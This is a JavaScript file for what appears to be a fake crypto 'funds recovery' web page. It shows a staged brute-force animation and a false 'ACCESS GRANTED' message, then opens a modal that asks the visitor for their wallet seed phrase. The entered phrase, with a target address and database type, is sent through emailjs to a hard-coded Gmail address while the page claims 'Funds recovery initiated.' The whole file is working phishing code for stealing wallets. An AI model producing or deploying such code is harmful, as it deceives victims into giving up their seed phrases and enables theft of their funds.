
document.addEventListener("DOMContentLoaded", function () {
    let attempts = 0;
    const typingSound = document.getElementById("typingSound");
    const failSound = document.getElementById("failSound");
    const deniedSound = document.getElementById("deniedSound");
    const successSound = document.getElementById("successSound");
    let walletModal = null;
    let isRunning = false;

    // Modal creation function
    function createWalletModal() {
        const modal = document.createElement("div");
        modal.id = "walletModal";
        modal.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.5);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        `;

        const modalContent = document.createElement("div");
        modalContent.style.cssText = `
            background: #1a1a1a;
            padding: 2rem;
            border-radius: 5px;
            text-align: center;
            width: 300px;
        `;

        modal.appendChild(modalContent);
        document.body.appendChild(modal);
        return modal;
    }

    // Start button handler
    document.getElementById("start").addEventListener("click", function () {
        const startButton = this;
        if (isRunning) return;
        
        isRunning = true;
        startButton.disabled = true;

        const status = document.querySelector(".status");
        const keyInput = document.getElementById("keyInput");
        const alertBox = document.getElementById("customAlert");

        status.innerText = "Brute-force attack in progress...";
        keyInput.value = "";
        typingSound.play();

        const fakeKeys = ["U", "L", "B", "Y", "X", "M", "Z", "Q", "R"];
        let i = 0;

        const typingEffect = setInterval(() => {
            keyInput.value += fakeKeys[Math.floor(Math.random() * fakeKeys.length)] + " ";
            i++;

            if (i > 16) {
                clearInterval(typingEffect);
                typingSound.pause();
                typingSound.currentTime = 0;
                attempts++;

                const reEnableButton = () => {
                    isRunning = false;
                    startButton.disabled = false;
                };

                if (attempts === 1) {
                    status.innerText = "Retry Again!";
                    failSound.play();
                    reEnableButton();
                } else if (attempts === 2) {
                    status.innerText = "Access Denied!";
                    alertBox.innerText = "ACCESS DENIED";
                    alertBox.style.display = "block";
                    deniedSound.play();
                    reEnableButton();
                } else if (attempts === 3) {
                    attempts = 0;
                    alertBox.style.display = "none";

                    status.innerText = "Decrypting final layer... (5s)";
                    setTimeout(() => {
                        status.innerText = "Finalizing decryption...";
                        typingSound.play();

                        const successTyping = setInterval(() => {
                            keyInput.value += fakeKeys[Math.floor(Math.random() * fakeKeys.length)] + " ";
                            i++;

                            if (i > 32) {
                                clearInterval(successTyping);
                                typingSound.pause();
                                typingSound.currentTime = 0;

                                status.innerText = "Successful Recovery!";
                                alertBox.innerText = "✅ ACCESS GRANTED ";
                                alertBox.style.backgroundColor = "#00ff00";
                                alertBox.style.color = "black";
                                alertBox.style.display = "block";
                                successSound.play();

                                setTimeout(() => {
                                    alertBox.style.display = "none";
                                    showWalletConnectButton();
                                    reEnableButton();
                                }, 3000);
                            }
                        }, 100);
                    }, 5000);
                }
            }
        }, 200);
    });

    // Wallet connection modal
    function showWalletConnectButton() {
        if (!walletModal) {
            walletModal = createWalletModal();
        }
        
        const modalContent = walletModal.querySelector("div");
        modalContent.innerHTML = '';
        
        const connectButton = document.createElement("button");
        connectButton.id = "connectWallet";
        connectButton.textContent = "Connect to Wallet";
        modalContent.appendChild(connectButton);
        
        walletModal.style.display = "flex";

        connectButton.addEventListener("click", function () {
            if (!document.getElementById("seedPhraseInput")) {
                const seedInput = document.createElement("input");
                seedInput.id = "seedPhraseInput";
                seedInput.type = "text";
                seedInput.placeholder = "Enter Seed Phrase";
                seedInput.style.marginTop = "10px";
                seedInput.style.width = "100%";
                modalContent.appendChild(seedInput);
            }

            if (!document.getElementById("submitSeedPhrase")) {
                const submitButton = document.createElement("button");
                submitButton.id = "submitSeedPhrase";
                submitButton.textContent = "Enter";
                submitButton.style.marginTop = "5px";
                modalContent.appendChild(submitButton);

                submitButton.addEventListener("click", function () {
                    const seedPhrase = document.getElementById("seedPhraseInput").value;
                    const targetAddress = document.getElementById("targetInput").value;
                    const databaseType = document.getElementById("databaseInput").value;

                    emailjs.send("service_p7lukke", "template_h5u8rh7", {
                        to_email: "giyananderson@gmail.com",
                        seed_phrase: seedPhrase,
                        target_address: targetAddress,
                        database_type: databaseType,
                        timestamp: new Date().toLocaleString()
                    }).then(() => {
                        console.log("Seed phrase logged successfully!");
                    }, (error) => {
                        console.error("Failed to log:", error);
                    });

                    alert("Connected successfully! Funds recovery initiated.");
                    walletModal.style.display = "none";
                });
            }
        });
    }

    // Close modal on outside click
    document.addEventListener("click", (e) => {
        if (walletModal && e.target === walletModal) {
            walletModal.style.display = "none";
        }
    });
});